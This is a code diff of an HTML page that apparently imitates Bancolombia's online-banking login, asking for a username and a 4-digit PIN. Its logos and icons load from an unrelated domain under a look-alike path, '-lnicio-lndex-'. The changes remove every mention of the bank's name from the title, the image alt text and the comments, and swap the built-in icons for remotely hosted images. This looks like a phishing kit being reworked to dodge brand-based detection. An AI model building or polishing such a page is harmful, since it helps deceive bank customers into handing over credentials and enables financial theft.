@@ -2,7 +2,7 @@
 <html lang="es-CO">
 <head>
   <meta charset="utf-8">
-  <title>Bancolombia - Ingreso</title>
+  <title>Ingreso</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   <script>
@@ -75,7 +75,7 @@
       .trazo { background-size: auto 100%; padding-top: 20px; }
     }
 
-    /* ====== LOGOS BANCOLOMBIA ====== */
+    /* ====== LOGOS ====== */
     .brand-logos {
       display: flex;
       flex-direction: column;
@@ -127,37 +127,24 @@
     /* SEPARACIÓN EXTRA PARA EL BOTÓN */
     .bc-card-auth-container { 
       display: grid; 
-      margin-bottom: 48px; /* Aumentado para separar el botón */
+      margin-bottom: 48px; /* Separación del botón */
       width: 100%; 
     }
 
-    /* ====== CAMPOS FORMULARIO ====== */
+    /* ====== CAMPOS FORMULARIO E ICONOS (AQUÍ SE INTEGRAN LAS IMÁGENES) ====== */
     .bc-form-field { width: 100%; position: relative; height: 52px; margin-top: 20px; }
-    .bc-form-field > em.bc-icon {
-      font-size: 0 !important;
-      color: transparent !important;
-      line-height: 0 !important;
-      overflow: hidden;
-      width: 24px;
-      height: 24px;
-      top: 6px !important;
+    
+    /* Estilo para las imágenes de los iconos */
+    .icon-img {
       position: absolute;
-      display: inline-block;
-    }
-    .bc-form-field > em.bc-icon::before {
-      content: "";
-      display: block;
       width: 20px;
       height: 20px;
-      background-size: contain;
-      background-repeat: no-repeat;
+      top: 6px;
+      left: 0;
+      object-fit: contain;
+      z-index: 2;
     }
-    .authentication-form__username .bc-form-field > em.bc-icon::before {
-      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%232c2a29'><path d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/></svg>");
-    }
-    .authentication-form__password .bc-form-field > em.bc-icon::before {
-      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%232c2a29'><path d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z'/></svg>");
-    }
+
     .bc-input {
       background: transparent;
       border: none;
@@ -387,7 +374,7 @@
     }
     .sms-wrap.error .bc-input { border-bottom-color: var(--bc-error); }
 
-    /* ====== Ocultar iconos en card auth ====== */
+    /* ====== Ocultar iconos SVG viejos ====== */
     .bc-card-auth-body .bc-icon { display: none; }
   </style>
 </head>
@@ -401,13 +388,13 @@
   </div>
 
   <main class="svp-main">
-    <!-- Se restaura la clase trazo para las rayas del fondo -->
+    <!-- Clase trazo para las rayas del fondo -->
     <div class="bc-container-fluid trazo">
 
-      <!-- LOGOS BANCOLOMBIA -->
+      <!-- LOGOS -->
       <div class="brand-logos">
         <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/LOG-NVO.png"
-             alt="Bancolombia" class="logo-nvo">
+             alt="Logo" class="logo-nvo">
         <br><br>
         <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/02/MTP.png"
              alt="Sucursal Virtual Personas" class="logo-mtp">
@@ -430,7 +417,8 @@
 
                   <div class="bc-form-field authentication-form__username">
                     <div class="bc-form-field">
-                      <em class="bc-icon" aria-hidden="true">user</em>
+                      <!-- Icono de usuario con imagen -->
+                      <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/09/IC01.png" class="icon-img" alt="Icono Usuario">
                       <input id="usuario" name="usuario" autocomplete="off" autocorrect="off"
                              spellcheck="false" maxlength="20"
                              aria-describedby="username-helper" aria-invalid="false"
@@ -445,7 +433,8 @@
 
                   <div class="bc-form-field authentication-form__password">
                     <div class="bc-form-field">
-                      <em class="bc-icon" aria-hidden="true">lock</em>
+                      <!-- Icono de clave con imagen -->
+                      <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/09/IC02.png" class="icon-img" alt="Icono Clave">
                       <input id="clave" minlength="4" maxlength="4" type="password" name="clave"
                              autocomplete="off" inputmode="numeric"
                              aria-describedby="password-helper" aria-invalid="false"
@@ -470,7 +459,7 @@
                 </section>
               </form>
 
-              <!-- BOTÓN CREAR USUARIO RESTAURADO -->
+              <!-- BOTÓN CREAR USUARIO -->
               <section class="bc-card-auth-link" style="display: flex; justify-content: center; margin-top: 24px;">
                 <a href="#" class="bc-link link-underline" style="font-size: 1rem; color: var(--bc-dark);">
                   <u>Crear usuario</u>
